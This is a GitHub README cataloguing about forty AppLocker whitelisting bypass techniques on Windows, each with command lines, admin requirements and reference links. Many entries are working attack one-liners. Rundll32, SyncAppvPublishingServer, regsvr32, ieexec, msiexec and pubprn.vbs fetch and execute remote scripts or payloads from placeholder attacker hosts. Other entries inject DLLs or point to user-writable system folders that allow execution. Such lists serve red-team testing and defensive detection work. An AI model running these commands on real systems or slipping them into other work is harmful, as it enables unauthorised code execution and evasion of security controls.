# Ultimate AppLocker ByPass List
The goal of this repository is to document the most common techniques to bypass AppLocker. 
This README file contains a complete list of all known bypasses.
Since AppLocker can be configured in different ways it makes sense to have master list of bypasses. 
This README.MD will be the master and will be updated with known and possible AppLocker bypasses.

**I have created a list of verified bypasses that works against the default rules created with AppLocker.**

For details on how I verified and how to create the default rules you can check my blog: 
https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/ 

[VerifiedBypasses-DefaultRules.MD](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedBypasses-DefaultRules.md)


Please contribute and do point out errors or resources I have forgotten.




## 1. Rundll32.exe

`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"`

`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");`

`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}`

`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")`

`rundll32 shell32.dll,Control_RunDLL payload.dll`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: No  

Notes:

Links:  
https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md



## 2. Regsvr32.exe

`regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: No  

Notes: 

Links:  
https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md



## 3. Msbuild.exe

`msbuild.exe pshell.xml`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: Yes  

Notes:

Links:  
https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614
http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html
https://github.com/Cn33liz/MSBuildShell
https://github.com/Cn33liz/MS17-012
https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
https://www.youtube.com/watch?v=aSDEAPXaz28
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md



## 4. Regsvcs.exe

`regsvcs.exe /U regsvcs.dll`
`regsvcs.exe regsvcs.dll`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: No  

Notes:

Links:  
https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md



## 5. Regasm.exe

`regasm.exe /U regsvcs.dll`
`regasm.exe regsvcs.dll`

Requires admin: /U does not require admin  
Windows binary: Yes  
Bypasses AppLocker Default rules: No  

Notes:

Links:  
https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md



## 6. Bginfo.exe

`bginfo.exe bginfo.bgi /popup /nolicprompt`

Requires admin: No  
Windows binary: No  
Bypasses AppLocker Default rules: No  

Notes:


Links:  
https://msitpros.com/?p=3831
https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/
https://msitpros.com/?p=3860



## 7. InstallUtil.exe

`InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: No  

Notes:

Links:  
https://github.com/subTee/AllTheThings
https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html
https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md



## 8. MSDT.exe

`Open .diagcab package`

Requires admin: ?  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/



## 9. mshta.exe

`mshta.exe evilfile.hta`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4



## 10. Execute .Bat

`cmd.exe /k < script.txt`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3



## 11. Execute .PS1

`Get-Content script.txt | iex`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3



## 12. Execute .VBS

`cscript.exe //E:vbscript script.txt`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3



## 13. PresentationHost.exe

Missing Example

Requires admin: ?  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  


Notes:

Links:  
https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf



## 14. dfsvc.exe

Missing Example

Requires admin: ?  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  


Notes:

Links:  
https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf



## 15. IEExec.exe

`ieexec.exe http://x.x.x.x:8080/bypass.exe`

Requires admin: ?  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?

Notes:

Links:  
https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/



## 16. cdb.exe

`cdb.exe -cf x64_calc.wds -o notepad.exe`

Requires admin: ?  
Windows binary: No  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html


## 17. dnx.exe

`dnx.exe consoleapp`

Requires admin: ?  
Windows binary: No  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/



## 18. rcsi.exe

`rcsi.exe bypass.csx`

Requires admin: ?  
Windows binary: No  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/



## 19. csi.exe

Missing example

Requires admin: ?  
Windows binary: No  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html



## 20. CPL loading location manipulation

`Control.exe`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/
https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/



## 21. msxsl.exe

`msxsl.exe customers.xml script.xsl`

Requires admin: No  
Windows binary: No  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1



## 22. msiexec.exe

`msiexec /quiet /i cmd.msi`
`msiexec /q /i http://192.168.100.3/tmp/cmd.png`

Requires admin: ?  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/


## 23. cmstp.exe

`cmstp.exe /ni /s c:\cmstp\CorpVPN.inf`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:  
https://msitpros.com/?p=3960
https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e


## 24. xwizard.exe

`xwizard.exe argument1 argument2`
DLL loading in same folder xwizard.dll

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:
http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/


## 25. fsi.exe

`fsi.exe c:\folder\d.fscript`

Requires admin: No  
Windows binary: No  
Bypasses AppLocker Default rules: ?  

Notes:

Links:
https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1
https://twitter.com/NickTyrer/status/904273264385589248
https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/



## 26. odbcconf.exe

`odbcconf -f file.rsp`

Requires admin: ?  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:
https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b



## 27. te.exe

`te.exe bypass.wsc`

Requires admin: No  
Windows binary: No  
Bypasses AppLocker Default rules: ?  

Notes: Can be used if the Test Authoring and Execution Framework is installed and is in a path that is whitelisted. 
Default location is: C:\program files (x86)\Windows Kits\10\testing\Runtimes\TAEF
 
Links:
https://twitter.com/gN3mes1s/status/927680266390384640
https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42



## 28. Placing files in writeable paths under c:\windows

The following folders are by default writable and executable by normal users
`C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
`C:\Windows\System32\spool\drivers\color`
`C:\Windows\Tasks`
`C:\windows\tracing`

Requires admin: No  
Windows binary: N/A  
Bypasses AppLocker Default rules: ?  

Notes: This list is based on Windows 10 1709. Run accesschk to verify on other Windows versions



## 29. Atbroker.exe

`ATBroker.exe /start malware`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:
http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/



## 30. WMIC.exe

`wmic process call create calc`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes: 

Links:
https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory



## 31. MavInject32.exe

`MavInject32.exe <PID> /INJECTRUNNING <PATH DLL>`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes: 

Links:
https://twitter.com/gN3mes1s/status/941315826107510784
https://twitter.com/Hexacorn/status/776122138063409152



## 32. Pubprn.vbs

`pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/api0cradle/fb164762143b1ff4042d9c662171a568/raw/709aff66095b7f60e5d6f456a5e42021a95ca802/test.sct`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes: 

Links:
https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/



## 33. slmgr.vbs

`slmgr.vbs`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes: Requires registry keys for com object.

Links:
https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
https://www.youtube.com/watch?v=3gz1QmiMhss



## 34. winrm.vbs

`winrm quickconfig`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes: Requires registry keys for com object.

Links:
https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
https://www.youtube.com/watch?v=3gz1QmiMhss



## 35. forfiles.exe

`forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:
https://twitter.com/vector_sec/status/896049052642533376



## 36. SyncAppvPublishingServer.exe

`SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX
`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:
https://twitter.com/monoxgas/status/895045566090010624



## 37. InfDefaultInstall.exe

`InfDefaultInstall.exe shady.inf`

Requires admin: ?  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:
https://twitter.com/KyleHanslovan/status/911997635455852544
https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a



## 38. Winword.exe

`winword.exe /l dllfile.dll`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:
https://twitter.com/subTee/status/884615369511636992



## 39. Runscripthelper.exe

`runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test`

Requires admin: No  
Windows binary: Yes  
Bypasses AppLocker Default rules: ?  

Notes:

Links:
https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc



## 40. Tracker.exe

`Tracker.exe /d .\calc.dll /c C:\Windows\write.exe`

Requires admin: No  
Windows binary: No  
Bypasses AppLocker Default rules: ?  

Notes:
Part of Visual studio. 
Requires TrackerUI.dll present in 1028 subfolder.

Links:
https://twitter.com/Sudhanshu_C/status/943011972261412864
